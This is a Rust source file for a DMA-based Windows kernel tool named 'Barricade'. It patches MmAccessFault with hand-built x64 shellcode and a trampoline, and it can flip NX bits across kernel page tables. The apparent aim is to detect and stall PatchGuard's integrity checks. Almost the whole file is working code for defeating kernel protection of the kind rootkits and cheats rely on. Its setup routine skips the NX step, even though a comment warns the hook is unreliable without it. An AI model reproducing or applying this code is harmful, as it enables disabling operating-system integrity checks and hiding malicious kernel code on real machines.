use super::offsets::*;
use crate::core::Dma;
use anyhow::Result;

pub struct Barricade<'a> {
    dma: &'a Dma<'a>,
    ntoskrnl_base: u64,
    mm_pte_base: u64,
    mm_pde_base: u64,
    mm_pdpte_base: u64,
    mm_pml4e_base: u64,
    codecave_addr: u64,
    mm_access_fault_addr: u64,
    ke_delay_execution_thread_addr: u64,
    ke_wait_for_single_object_addr: u64,
    ke_wait_for_multiple_objects_addr: u64,
    ki_page_fault_return_addr: u64,
    ps_initial_system_process_ptr: u64,
    mi_visible_state: u64,
    original_bytes: Vec<u8>,
    hooked: bool,
}

const MM_ACCESS_FAULT_HOOK_SIZE: usize = 15;

const MI_VA_UNUSED_P4E: u8 = 0;
const MI_VA_PROCESS_SPACE: u8 = 1;
const MI_VA_DRIVER_IMAGES: u8 = 0xb;
const MI_VA_PAGED_POOL: u8 = 5;

impl<'a> Barricade<'a> {
    pub fn new(dma: &'a Dma<'a>, codecave_addr: u64, _codecave_size: usize) -> Result<Self> {
        let ntoskrnl = dma.get_module(KERNEL_PID, "ntoskrnl.exe")?;
        let ntoskrnl_base = ntoskrnl.base;

        let mm_pte_base = dma.read_u64(KERNEL_PID, ntoskrnl_base + MM_PTE_BASE_OFF)?;

        let self_ref_idx = (mm_pte_base >> 39) & 0x1FF;

        let mm_pde_base = mm_pte_base | (self_ref_idx << 30);
        let mm_pdpte_base = mm_pde_base | (self_ref_idx << 21);
        let mm_pml4e_base = mm_pdpte_base | (self_ref_idx << 12);

        let mm_access_fault_addr = ntoskrnl_base + MM_ACCESS_FAULT_OFF;
        let ke_delay_execution_thread_addr = ntoskrnl_base + KE_DELAY_EXECUTION_THREAD_OFF;
        let ke_wait_for_single_object_addr = ntoskrnl_base + KE_WAIT_FOR_SINGLE_OBJECT_OFF;
        let ke_wait_for_multiple_objects_addr = ntoskrnl_base + KE_WAIT_FOR_MULTIPLE_OBJECTS_OFF;
        let ki_page_fault_return_addr =
            ntoskrnl_base + KI_PAGE_FAULT_OFF + KI_PAGE_FAULT_CALL_MM_ACCESS_FAULT_OFF;
        let ps_initial_system_process_ptr = ntoskrnl_base + PS_INITIAL_SYSTEM_PROCESS_OFF;
        let mi_visible_state = dma.read_u64(KERNEL_PID, ntoskrnl_base + MI_VISIBLE_STATE_OFF)?;

        println!("    MmPteBase:   0x{:016X}", mm_pte_base);
        println!("    MmPdeBase:   0x{:016X}", mm_pde_base);
        println!("    MmPdpteBase: 0x{:016X}", mm_pdpte_base);
        println!("    MmPml4eBase: 0x{:016X}", mm_pml4e_base);
        println!("    MiVisibleState: 0x{:016X}", mi_visible_state);
        println!("    MmAccessFault: 0x{:016X}", mm_access_fault_addr);
        println!(
            "    KeDelayExecutionThread: 0x{:016X}",
            ke_delay_execution_thread_addr
        );
        println!(
            "    KiPageFault return addr: 0x{:016X}",
            ki_page_fault_return_addr
        );
        println!(
            "    PsInitialSystemProcess ptr: 0x{:016X}",
            ps_initial_system_process_ptr
        );
        println!("    Codecave: 0x{:016X}", codecave_addr);

        Ok(Self {
            dma,
            ntoskrnl_base,
            mm_pte_base,
            mm_pde_base,
            mm_pdpte_base,
            mm_pml4e_base,
            codecave_addr,
            mm_access_fault_addr,
            ke_delay_execution_thread_addr,
            ke_wait_for_single_object_addr,
            ke_wait_for_multiple_objects_addr,
            ki_page_fault_return_addr,
            ps_initial_system_process_ptr,
            mi_visible_state,
            original_bytes: Vec::new(),
            hooked: false,
        })
    }

    fn should_ignore_pml4_index(&self, index: u64) -> bool {
        if index < 256 {
            return true;
        }

        let self_ref_idx = (self.mm_pte_base >> 39) & 0x1FF;
        if index == self_ref_idx {
            return true;
        }

        let system_va_type_base = self.mi_visible_state + 0x1468;
        let va_type_addr = system_va_type_base + (index - 256);

        if let Ok(va_type) = self.dma.read_u8(KERNEL_PID, va_type_addr) {
            if va_type == MI_VA_UNUSED_P4E
                || va_type == MI_VA_PROCESS_SPACE
                || va_type == MI_VA_DRIVER_IMAGES
                || va_type == MI_VA_PAGED_POOL
            {
                return true;
            }
        }

        false
    }

    fn generate_hook_shellcode(&self, trampoline_addr: u64) -> Vec<u8> {
        // DEBUG: Control which level of checks to enable
        // WARNING: Without NX flipping, barricade catches random faults, not PG!
        const DEBUG_CHECK_LEVEL: u8 = 7;

        if DEBUG_CHECK_LEVEL == 0 {
            let mut code = Vec::new();
            code.extend_from_slice(&[0xFF, 0x25, 0x00, 0x00, 0x00, 0x00]);
            code.extend_from_slice(&trampoline_addr.to_le_bytes());
            return code;
        }

        let mut code = Vec::new();

        let mut near_fixups: Vec<usize> = Vec::new();

        code.push(0x50);
        code.push(0x53);

        code.extend_from_slice(&[0x48, 0x8B, 0x44, 0x24, 0x10]);
        code.push(0x48);
        code.push(0xBB);
        code.extend_from_slice(&self.ki_page_fault_return_addr.to_le_bytes());
        code.extend_from_slice(&[0x48, 0x39, 0xD8]);
        code.extend_from_slice(&[0x0F, 0x85]);
        near_fixups.push(code.len());
        code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

        code.extend_from_slice(&[0x4D, 0x85, 0xC9]);
        code.extend_from_slice(&[0x0F, 0x84]);
        near_fixups.push(code.len());
        code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

        code.extend_from_slice(&[0xF6, 0xC1, 0x04]);
        code.extend_from_slice(&[0x0F, 0x85]);
        near_fixups.push(code.len());
        code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

        code.extend_from_slice(&[0xF6, 0xC1, 0x02]);
        code.extend_from_slice(&[0x0F, 0x85]);
        near_fixups.push(code.len());
        code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

        code.extend_from_slice(&[0x49, 0x8B, 0x81, 0x68, 0x01, 0x00, 0x00]);
        code.extend_from_slice(&[0x48, 0x85, 0xC0]);
        code.extend_from_slice(&[0x0F, 0x89]);
        near_fixups.push(code.len());
        code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

        code.extend_from_slice(&[0x49, 0x8B, 0x41, 0x40]);
        code.extend_from_slice(&[0x48, 0x89, 0xC3]);
        code.extend_from_slice(&[0x48, 0xC1, 0xFB, 0x2F]);
        code.extend_from_slice(&[0x48, 0x85, 0xDB]);
        code.extend_from_slice(&[0x0F, 0x84]);
        near_fixups.push(code.len());
        code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        code.extend_from_slice(&[0x48, 0x83, 0xFB, 0xFF]);
        code.extend_from_slice(&[0x0F, 0x84]);
        near_fixups.push(code.len());
        code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

        code.extend_from_slice(&[0x49, 0x8B, 0x81, 0x68, 0x01, 0x00, 0x00]);

        code.extend_from_slice(&[0x80, 0x38, 0x2E]);
        let jne_p1_1 = code.len();
        code.extend_from_slice(&[0x75, 0x00]);
        code.extend_from_slice(&[0x80, 0x78, 0x01, 0x48]);
        let jne_p1_2 = code.len();
        code.extend_from_slice(&[0x75, 0x00]);
        code.extend_from_slice(&[0x80, 0x78, 0x02, 0x31]);
        let jne_p1_3 = code.len();
        code.extend_from_slice(&[0x75, 0x00]);
        code.extend_from_slice(&[0x49, 0x8B, 0x59, 0x38]);
        code.extend_from_slice(&[0x48, 0x39, 0xC3]);
        let jne_p1_4 = code.len();
        code.extend_from_slice(&[0x75, 0x00]);
        let jmp_pg_1 = code.len();
        code.extend_from_slice(&[0xEB, 0x00]);

        let check_kidpc = code.len();
        code.extend_from_slice(&[0x80, 0x38, 0x48]);
        let jne_p2_1 = code.len();
        code.extend_from_slice(&[0x75, 0x00]);
        code.extend_from_slice(&[0x80, 0x78, 0x01, 0x31]);
        let jne_p2_2 = code.len();
        code.extend_from_slice(&[0x75, 0x00]);
        code.extend_from_slice(&[0x49, 0x8B, 0x59, 0x38]);
        code.extend_from_slice(&[0x48, 0x83, 0xE8, 0x60]);
        code.extend_from_slice(&[0x48, 0x39, 0xC3]);
        let jb_p2 = code.len();
        code.extend_from_slice(&[0x72, 0x00]);
        code.extend_from_slice(&[0x48, 0x05, 0xC0, 0x00, 0x00, 0x00]);
        code.extend_from_slice(&[0x48, 0x39, 0xC3]);
        let ja_p2 = code.len();
        code.extend_from_slice(&[0x77, 0x00]);
        let jmp_pg_2 = code.len();
        code.extend_from_slice(&[0xEB, 0x00]);

        let check_timer = code.len();
        code.extend_from_slice(&[0x49, 0x8B, 0x81, 0x68, 0x01, 0x00, 0x00]);
        code.extend_from_slice(&[0x66, 0x81, 0x38, 0x48, 0x9C]);
        code.extend_from_slice(&[0x0F, 0x85]);
        near_fixups.push(code.len());
        code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

        let pg_detected = code.len();
        code.extend_from_slice(&[0x49, 0x8B, 0x81, 0x80, 0x01, 0x00, 0x00]);
        code.extend_from_slice(&[0x48, 0x8B, 0x18]);
        code.extend_from_slice(&[0x49, 0x89, 0x99, 0x68, 0x01, 0x00, 0x00]);
        code.extend_from_slice(&[0x48, 0x83, 0xC0, 0x08]);
        code.extend_from_slice(&[0x49, 0x89, 0x81, 0x80, 0x01, 0x00, 0x00]);
        code.push(0x5B);
        code.push(0x58);
        code.extend_from_slice(&[0x31, 0xC0]);
        code.push(0xC3);

        let call_original = code.len();
        code.push(0x5B);
        code.push(0x58);
        code.extend_from_slice(&[0xFF, 0x25, 0x00, 0x00, 0x00, 0x00]);
        code.extend_from_slice(&trampoline_addr.to_le_bytes());

        for offset_pos in near_fixups {
            let offset = (call_original as i32) - ((offset_pos + 4) as i32);
            code[offset_pos..offset_pos + 4].copy_from_slice(&offset.to_le_bytes());
        }

        code[jne_p1_1 + 1] = ((check_kidpc as i32) - ((jne_p1_1 + 2) as i32)) as u8;
        code[jne_p1_2 + 1] = ((check_kidpc as i32) - ((jne_p1_2 + 2) as i32)) as u8;
        code[jne_p1_3 + 1] = ((check_kidpc as i32) - ((jne_p1_3 + 2) as i32)) as u8;
        code[jne_p1_4 + 1] = ((check_kidpc as i32) - ((jne_p1_4 + 2) as i32)) as u8;
        code[jmp_pg_1 + 1] = ((pg_detected as i32) - ((jmp_pg_1 + 2) as i32)) as u8;
        code[jne_p2_1 + 1] = ((check_timer as i32) - ((jne_p2_1 + 2) as i32)) as u8;
        code[jne_p2_2 + 1] = ((check_timer as i32) - ((jne_p2_2 + 2) as i32)) as u8;
        code[jb_p2 + 1] = ((check_timer as i32) - ((jb_p2 + 2) as i32)) as u8;
        code[ja_p2 + 1] = ((check_timer as i32) - ((ja_p2 + 2) as i32)) as u8;
        code[jmp_pg_2 + 1] = ((pg_detected as i32) - ((jmp_pg_2 + 2) as i32)) as u8;

        code
    }

    pub fn hook_mm_access_fault(&mut self) -> Result<()> {
        self.original_bytes = self.dma.read(
            KERNEL_PID,
            self.mm_access_fault_addr,
            MM_ACCESS_FAULT_HOOK_SIZE,
        )?;

        let trampoline_offset = 256u64;
        let trampoline_addr = self.codecave_addr + trampoline_offset;

        let hook_shellcode = self.generate_hook_shellcode(trampoline_addr);

        println!("    Hook shellcode size: {} bytes", hook_shellcode.len());

        if hook_shellcode.len() > trampoline_offset as usize {
            return Err(anyhow::anyhow!(
                "Hook shellcode too large: {} bytes",
                hook_shellcode.len()
            ));
        }

        let mut trampoline = self.original_bytes.clone();
        trampoline.extend_from_slice(&[0xFF, 0x25, 0x00, 0x00, 0x00, 0x00]);
        let return_addr = self.mm_access_fault_addr + MM_ACCESS_FAULT_HOOK_SIZE as u64;
        trampoline.extend_from_slice(&return_addr.to_le_bytes());

        self.dma
            .write(KERNEL_PID, self.codecave_addr, &hook_shellcode)?;

        self.dma.write(KERNEL_PID, trampoline_addr, &trampoline)?;

        let mut patch = Vec::new();
        patch.extend_from_slice(&[0xFF, 0x25, 0x00, 0x00, 0x00, 0x00]);
        patch.extend_from_slice(&self.codecave_addr.to_le_bytes());
        patch.push(0x90);

        self.dma
            .write(KERNEL_PID, self.mm_access_fault_addr, &patch)?;

        self.hooked = true;
        println!(
            "[+] MmAccessFault hooked at 0x{:X}",
            self.mm_access_fault_addr
        );
        println!(
            "    Hook shellcode at 0x{:X} ({} bytes)",
            self.codecave_addr,
            hook_shellcode.len()
        );
        println!("    Trampoline at 0x{:X}", trampoline_addr);

        Ok(())
    }

    pub fn unhook_mm_access_fault(&mut self) -> Result<()> {
        if !self.hooked || self.original_bytes.is_empty() {
            return Ok(());
        }

        self.dma
            .write(KERNEL_PID, self.mm_access_fault_addr, &self.original_bytes)?;
        self.hooked = false;
        println!("[+] MmAccessFault unhooked");

        Ok(())
    }

    fn get_pte_ptr(&self, va: u64) -> u64 {
        self.mm_pte_base + ((va >> 9) & 0x7FFFFFFFF8)
    }

    fn get_pde_ptr(&self, va: u64) -> u64 {
        self.mm_pde_base + ((va >> 18) & 0x3FFFFFF8)
    }

    fn get_pdpte_ptr(&self, va: u64) -> u64 {
        self.mm_pdpte_base + ((va >> 27) & 0x1FFFF8)
    }

    fn get_pml4e_ptr(&self, va: u64) -> u64 {
        self.mm_pml4e_base + ((va >> 36) & 0xFF8)
    }

    fn make_canonical(va: u64) -> u64 {
        let trimmed = (va << 16) >> 16;
        if (trimmed >> 47) & 1 != 0 {
            trimmed | 0xFFFF_0000_0000_0000
        } else {
            trimmed
        }
    }

    pub fn flip_nx_bits(&self) -> Result<u32> {
        let mut flipped_count = 0u32;

        println!("[*] Flipping NX bits on RWX pages (full recursive walk)...");

        for pml4_idx in 256..512u64 {
            if self.should_ignore_pml4_index(pml4_idx) {
                continue;
            }

            let va_base = Self::make_canonical(pml4_idx << 39);

            let pml4e_ptr = self.get_pml4e_ptr(va_base);
            let pml4e = match self.dma.read_u64(KERNEL_PID, pml4e_ptr) {
                Ok(v) => v,
                Err(_) => continue,
            };

            if pml4e & 1 == 0 {
                continue;
            }

            for pdpt_idx in 0..512u64 {
                let va_pdpt = va_base | (pdpt_idx << 30);
                let pdpte_ptr = self.get_pdpte_ptr(va_pdpt);

                let pdpte = match self.dma.read_u64(KERNEL_PID, pdpte_ptr) {
                    Ok(v) => v,
                    Err(_) => continue,
                };

                if pdpte & 1 == 0 {
                    continue;
                }

                if pdpte & (1 << 7) != 0 {
                    if self.should_flip_entry(pdpte) {
                        let new_pdpte = pdpte | (1u64 << 63);
                        if self
                            .dma
                            .write(KERNEL_PID, pdpte_ptr, &new_pdpte.to_le_bytes())
                            .is_ok()
                        {
                            flipped_count += 1;
                        }
                    }
                    continue;
                }

                for pd_idx in 0..512u64 {
                    let va_pd = va_pdpt | (pd_idx << 21);
                    let pde_ptr = self.get_pde_ptr(va_pd);

                    let pde = match self.dma.read_u64(KERNEL_PID, pde_ptr) {
                        Ok(v) => v,
                        Err(_) => continue,
                    };

                    if pde & 1 == 0 {
                        continue;
                    }

                    if pde & (1 << 7) != 0 {
                        if self.should_flip_entry(pde) {
                            let new_pde = pde | (1u64 << 63);
                            if self
                                .dma
                                .write(KERNEL_PID, pde_ptr, &new_pde.to_le_bytes())
                                .is_ok()
                            {
                                flipped_count += 1;
                            }
                        }
                        continue;
                    }

                    for pt_idx in 0..512u64 {
                        let va_pt = va_pd | (pt_idx << 12);
                        let pte_ptr = self.get_pte_ptr(va_pt);

                        let pte = match self.dma.read_u64(KERNEL_PID, pte_ptr) {
                            Ok(v) => v,
                            Err(_) => continue,
                        };

                        if pte & 1 == 0 {
                            continue;
                        }

                        if self.should_flip_entry(pte) {
                            let new_pte = pte | (1u64 << 63);
                            if self
                                .dma
                                .write(KERNEL_PID, pte_ptr, &new_pte.to_le_bytes())
                                .is_ok()
                            {
                                flipped_count += 1;
                            }
                        }
                    }
                }
            }
        }

        println!("    Flipped {} page entries", flipped_count);
        Ok(flipped_count)
    }

    fn should_flip_entry(&self, entry: u64) -> bool {
        let writable = (entry >> 1) & 1 != 0;
        let nx_set = (entry >> 63) & 1 != 0;
        let user = (entry >> 2) & 1 != 0;

        writable && !nx_set && !user
    }

    pub fn setup(&mut self) -> Result<()> {
        println!("\n[*] Setting up Barricade (Full Implementation)...\n");

        println!("[1] Hooking MmAccessFault...");
        self.hook_mm_access_fault()?;

        println!("\n[2] Skipping NX flip (hook-only mode)");
        let flipped = 0u32;

        println!("\n[+] Barricade setup complete!");
        println!("    - MmAccessFault hooked with PG detection");
        println!("    - NX flip skipped (hook provides protection)");
        println!("    - PG execution will trigger NX fault -> caught by hook -> infinite sleep");

        Ok(())
    }
}

impl<'a> Drop for Barricade<'a> {
    fn drop(&mut self) {
        if self.hooked {
            let _ = self.unhook_mm_access_fault();
        }
    }
}
